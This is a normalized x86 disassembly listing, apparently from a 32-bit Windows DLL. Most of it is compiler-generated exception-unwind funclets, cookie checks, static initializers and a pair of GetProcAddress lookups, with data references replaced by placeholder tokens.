jmp sub_10011795
sub_1004a94f
lea ecx [ ebp - 0xa0 ]
jmp sub_100025e2
sub_1004a95a
lea esi [ ebp - 0x3c ]
jmp sub_10011bce
sub_1004a962
lea ecx [ ebp - 0xbc ]
jmp sub_100025e2
sub_1004a96d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc0 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a995
lea edi [ ebp - 0xa0 ]
jmp sub_10002634
sub_1004a9a0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x9c ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_10020040
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a9ce
lea eax [ ebp - 0x1c ]
push eax
call sub_10007c4c
retn
sub_1004a9d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a9f3
lea eax [ ebp - 0xb8 ]
jmp sub_1000de1e
sub_1004a9fe
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xbc ]
mov ecx [ edx - 0xc0 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004aa1f
lea eax [ ebp - 0x98 ]
jmp sub_1000de3a
sub_1004aa2a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004aa4b
lea ecx [ ebp - 0x58 ]
jmp sub_10001da0
sub_1004aa53
lea ecx [ ebp - 0x74 ]
jmp sub_100025e2
sub_1004aa5b
lea ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_1004aa63
lea ecx [ ebp - 0x58 ]
jmp sub_100025e2
sub_1004aa6b
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x3c ]
jmp sub_100025e2
sub_1004aa84
lea eax [ ebp - 0x124 ]
jmp sub_1000de3a
sub_1004aa8f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x128 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004aab7
mov ecx [ ebp + 0x8 ]
jmp sub_100132a0
sub_1004aabf
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_100025e2
sub_1004aaca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004aae5
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_10001da0
sub_1004aafe
lea eax [ ebp - 0xa8 ]
jmp sub_1000de1e
sub_1004ab09
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ab27
mov ecx [ ebp - 0x10 ]
jmp sub_1000da83
sub_1004ab2f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ab4a
lea ecx [ ebp - 0x4c ]
jmp sub_100025e2
sub_1004ab52
lea ecx [ ebp - 0xf4 ]
jmp sub_100025e2
sub_1004ab5d
lea eax [ ebp - 0xd8 ]
jmp sub_1000c359
sub_1004ab68
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_1004ab70
push [ ebp - 0xf8 ]
call sub_1002004f
pop ecx
retn
sub_1004ab7d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x104 ]
mov ecx [ edx - 0x108 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004abab
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
push [ ebp - 0x14 ]
call sub_1000927e
sub_1004abc4
lea ecx [ ebp - 0x80 ]
jmp sub_100025e2
sub_1004abcc
lea ecx [ ebp + 0x20 ]
jmp sub_100025e2
sub_1004abd4
lea ecx [ ebp - 0x64 ]
jmp sub_100025e2
sub_1004abdc
lea ecx [ ebp - 0x20 ]
jmp sub_1000da83
sub_1004abe4
lea ecx [ ebp + 0x3c ]
jmp sub_100025e2
sub_1004abec
lea ecx [ ebp + 0x90 ]
jmp sub_100025e2
sub_1004abf7
lea ecx [ ebp + 0x74 ]
jmp sub_100025e2
sub_1004abff
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_1004ac07
lea ecx [ ebp ]
jmp sub_100104f6
sub_1004ac0f
lea ecx [ ebp + 0x58 ]
jmp sub_10001da0
sub_1004ac17
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_1004ac1f
lea eax [ ebp - 0x28 ]
jmp sub_1001005d
sub_1004ac27
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_10020040
mov ecx [ edx + 0xb8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ac52
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004ac5a
lea ecx [ ebp - 0x54 ]
jmp sub_100025e2
sub_1004ac62
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ac87
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
retn
sub_1004ac91
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004acac
lea eax [ ebp - 0x2c ]
push eax
call sub_10007c4c
retn
sub_1004acb6
lea ecx [ ebp - 0x20 ]
jmp sub_10007b41
sub_1004acbe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004acd9
lea eax [ ebp - 0x1c ]
push eax
call sub_10007c4c
retn
sub_1004ace3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004acfe
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
retn
sub_1004ad08
lea ecx [ ebp - 0x18 ]
jmp sub_10007b41
sub_1004ad10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ad2b
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
retn
sub_1004ad35
lea ecx [ ebp - 0x18 ]
jmp sub_10007b41
sub_1004ad3d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ad58
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
retn
sub_1004ad62
lea ecx [ ebp - 0x18 ]
jmp sub_10007b41
sub_1004ad6a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ad85
lea eax [ ebp - 0x24 ]
push eax
call sub_10007c4c
retn
sub_1004ad8f
lea ecx [ ebp - 0x18 ]
jmp sub_10007b41
sub_1004ad97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004adb2
lea ecx [ ebp - 0x80 ]
jmp sub_100025e2
sub_1004adba
lea ecx [ ebp - 0x64 ]
jmp sub_100025e2
sub_1004adc2
lea ecx [ ebp - 0x28 ]
jmp sub_10011795
sub_1004adca
lea eax [ ebp - 0x108 ]
jmp sub_10002709
sub_1004add5
lea ecx [ ebp - 0x44 ]
jmp sub_100025e2
sub_1004addd
lea esi [ ebp + 0x28 ]
jmp sub_10011bce
sub_1004ade5
lea ecx [ ebp + 0x50 ]
jmp sub_100025e2
sub_1004aded
lea ecx [ ebp + 0x34 ]
jmp sub_100025e2
sub_1004adf5
lea ecx [ ebp - 0x44 ]
jmp sub_100025e2
sub_1004adfd
lea esi [ ebp ]
jmp sub_10011bce
sub_1004ae05
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_100025e2
sub_1004ae1e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10c ]
xor ecx eax
call sub_10020040
mov ecx [ edx + 0x78 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ae46
lea ecx [ ebp - 0x14 ]
jmp sub_1000ff0a
sub_1004ae4e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004ae69
lea eax [ ebp - 0x10c ]
jmp sub_1001005d
sub_1004ae74
lea ecx [ ebp - 0xe4 ]
jmp sub_10001da0
sub_1004ae7f
lea ecx [ ebp - 0x100 ]
jmp sub_10001da0
sub_1004ae8a
lea ecx [ ebp - 0xc8 ]
jmp sub_1000b816
sub_1004ae95
lea ecx [ ebp - 0xa8 ]
jmp sub_1000efa8
sub_1004aea0
lea eax [ ebp - 0x114 ]
jmp sub_1001005d
sub_1004aeab
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x114 ]
mov ecx [ edx - 0x118 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004aed9
lea eax [ ebp - 0x28 ]
jmp sub_100013c2
sub_1004aee1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004aefc
lea ecx [ ebp + 0x7c ]
jmp sub_100025e2
sub_1004af04
lea ecx [ ebp ]
jmp sub_100025e2
sub_1004af0c
lea ecx [ ebp - 0xb4 ]
jmp sub_100025e2
sub_1004af17
lea ecx [ ebp - 0x98 ]
jmp sub_100025e2
sub_1004af22
lea ecx [ ebp + 0x60 ]
jmp sub_100025e2
sub_1004af2a
lea ecx [ ebp + 0x98 ]
jmp sub_100025e2
sub_1004af35
lea eax [ ebp - 0x1c4 ]
jmp sub_10002709
sub_1004af40
lea ecx [ ebp - 0x7c ]
jmp sub_100025e2
sub_1004af48
lea ecx [ ebp - 0x60 ]
jmp sub_100025e2
sub_1004af50
lea ecx [ ebp - 0x24 ]
jmp sub_10011795
sub_1004af58
lea esi [ ebp + 0x38 ]
jmp sub_10011bce
sub_1004af60
lea ecx [ ebp - 0x44 ]
jmp sub_100025e2
sub_1004af68
lea ecx [ ebp + 0x98 ]
jmp sub_100025e2
sub_1004af73
lea ecx [ ebp + 0x1c ]
jmp sub_100025e2
sub_1004af7b
lea ecx [ ebp - 0x44 ]
jmp sub_100025e2
sub_1004af83
lea esi [ ebp + 0x38 ]
jmp sub_10011bce
sub_1004af8b
lea eax [ ebp - 0x13c ]
jmp sub_10002709
sub_1004af96
lea ecx [ ebp - 0x44 ]
jmp sub_100025e2
sub_1004af9e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c8 ]
xor ecx eax
call sub_10020040
mov ecx [ edx + 0xc0 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004afc9
lea ecx [ ebp - 0x58 ]
jmp sub_100025e2
sub_1004afd1
lea ecx [ ebp - 0x3c ]
jmp sub_100025e2
sub_1004afd9
lea ecx [ ebp - 0x20 ]
jmp sub_10011795
sub_1004afe1
lea ecx [ ebp - 0x74 ]
jmp sub_100025e2
sub_1004afe9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b004
lea ecx [ ebp - 0xb8 ]
jmp sub_10001da0
sub_1004b00f
lea ecx [ ebp - 0x64 ]
jmp sub_100025e2
sub_1004b017
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_1004b01f
lea ecx [ ebp - 0x9c ]
jmp sub_100025e2
sub_1004b02a
lea ecx [ ebp - 0xd4 ]
jmp sub_100025e2
sub_1004b035
lea ecx [ ebp - 0x7c ]
jmp sub_10013fbb
sub_1004b03d
lea ecx [ ebp - 0xb8 ]
jmp sub_100025e2
sub_1004b048
lea ecx [ ebp - 0x10c ]
jmp sub_100025e2
sub_1004b053
lea ecx [ ebp - 0x128 ]
jmp sub_100025e2
sub_1004b05e
lea ecx [ ebp - 0xf0 ]
jmp sub_100025e2
sub_1004b069
lea ecx [ ebp - 0x144 ]
jmp sub_100025e2
sub_1004b074
lea ecx [ ebp - 0x70 ]
jmp sub_10014066
sub_1004b07c
lea eax [ ebp - 0x1d8 ]
jmp sub_1000c359
sub_1004b087
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004b08f
lea ecx [ ebp - 0x9c ]
jmp sub_10001da0
sub_1004b09a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1dc ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b0c2
lea ecx [ ebp - 0x68 ]
jmp sub_100025e2
sub_1004b0ca
lea ecx [ ebp - 0x4c ]
jmp sub_100025e2
sub_1004b0d2
lea ecx [ ebp - 0x78 ]
jmp sub_10013f8e
sub_1004b0da
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_1004b0e2
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7c ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b10a
lea eax [ ebp - 0x58 ]
jmp sub_100013c2
sub_1004b112
lea eax [ ebp - 0x40 ]
jmp sub_1000f3a3
sub_1004b11a
lea ecx [ ebp - 0x5c ]
jmp sub_1000f207
sub_1004b122
lea ecx [ ebp + 0x90 ]
jmp sub_100025e2
sub_1004b12d
lea ecx [ ebp ]
jmp sub_1000eef5
sub_1004b135
lea ecx [ ebp + 0x4 ]
jmp sub_10001da0
sub_1004b13d
lea ecx [ ebp + 0x20 ]
jmp sub_100025e2
sub_1004b145
lea ecx [ ebp + 0x3c ]
jmp sub_100025e2
sub_1004b14d
lea ecx [ ebp + 0x58 ]
jmp sub_100025e2
sub_1004b155
lea ecx [ ebp ]
jmp sub_10010783
sub_1004b15d
lea ecx [ ebp + 0xac ]
jmp sub_10001da0
sub_1004b168
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov ecx [ edx + 0xd4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b190
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b1ab
lea ecx [ ebp - 0x78 ]
jmp sub_100025e2
sub_1004b1b3
lea ecx [ ebp - 0x34 ]
jmp sub_1000b816
sub_1004b1bb
lea eax [ ebp - 0x58 ]
push eax
call sub_1000927e
retn
sub_1004b1c5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b1ea
lea ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_1004b1f2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004b220
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b22b
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b236
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b241
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b24c
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b257
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b262
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b26d
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b278
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b283
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b28e
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b299
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b2a4
mov ecx rw-data
call sub_1001b165
push sub_1004b3f0
call sub_10024d30
pop ecx
retn
sub_1004b2ba
push sub_1004b3fa
call sub_10024d30
pop ecx
retn
sub_1004b2c6
mov ecx rw-data
call sub_1001b165
push sub_1004b404
call sub_10024d30
pop ecx
retn
sub_1004b2dc
push sub_1004b40e
call sub_10024d30
pop ecx
retn
sub_1004b2f0
push sub_1004b420
call sub_10024d30
pop ecx
retn
sub_1004b300
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b310
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_1004b330
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_1004b350
call sub_1001f560
mov [ rw-data ] 0x3
mov [ rw-data ] eax
retn
sub_1004b370
push 0x0
push r--data
mov ecx rw-data
call sub_1001ece0
push sub_1004b4f0
call sub_10024d30
pop ecx
retn
sub_1004b390
push 0x0
push r--data
mov ecx rw-data
call sub_1001ece0
push sub_1004b4b0
call sub_10024d30
pop ecx
retn
sub_1004b3b0
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b3c0
call sub_1001f5d0
mov [ rw-data ] eax
retn
sub_1004b3d0
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b3e0
call sub_1001f560
mov [ rw-data ] eax
retn
sub_1004b3f0
mov ecx rw-data
jmp sub_1001b196
sub_1004b3fa
mov ecx rw-data
jmp sub_10007b41
sub_1004b404
mov ecx rw-data
jmp sub_1001b196
sub_1004b40e
mov ecx rw-data
jmp sub_1001c36d
sub_1004b4b0
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_1002004f
add esp 0x4
sub_1004b4f0
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_1002004f
add esp 0x4
sub_1004b530
mov [ rw-data ] r--data
retn
sub_1004b540
mov [ rw-data ] r--data
retn
sub_1004b550
mov [ rw-data ] r--data
retn
sub_1004b560
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1002004f
add esp 0x4
sub_1004b58e
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100202c9
sub_1004b5a2
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100202c9
sub_1004b5b6
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100202c9
